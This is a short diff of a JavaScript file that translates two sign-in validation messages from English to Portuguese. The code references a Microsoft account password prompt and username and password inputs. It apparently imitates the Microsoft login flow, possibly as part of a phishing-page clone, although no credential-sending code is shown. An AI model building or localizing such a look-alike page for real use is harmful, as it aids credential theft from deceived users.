@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const unReq = "Enter a valid email address, phone number, or Skype name."
-    const pwdReq = "Please enter the password for your Microsoft account."
+    const unReq = "Insira um endereço de email, número de telefone ou nome Skype válido."
+    const pwdReq = "Use a senha da sua conta Microsoft."
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
     let view = "uname";
